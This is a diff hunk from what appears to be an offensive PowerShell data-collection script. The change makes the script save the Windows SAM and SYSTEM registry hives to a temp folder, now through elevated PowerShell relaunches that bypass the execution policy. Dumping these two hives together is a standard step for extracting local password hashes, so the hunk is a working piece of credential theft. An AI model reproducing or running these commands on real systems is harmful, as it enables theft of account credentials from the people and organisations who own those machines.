@@ -428,9 +428,11 @@ $output > $env:TEMP\$FolderName/computerData.txt
 
 ############################################################################################################################################################
 
-reg save HKLM\sam $env:TEMP\$FolderName/SAM
-reg save HKLM\system $env:TEMP\$FolderName/SYSTEM
+#reg save HKLM\sam $env:TEMP\$FolderName/SAM
+Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"reg save HKLM\sam $env:TEMP\$FolderName/SAM`"" -Verb RunAs
 
+#reg save HKLM\system $env:TEMP\$FolderName/SYSTEM
+Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"reg save HKLM\system $env:TEMP\$FolderName/SYSTEM`"" -Verb RunAs
 ############################################################################################################################################################
 
 ############################################################################################################################################################
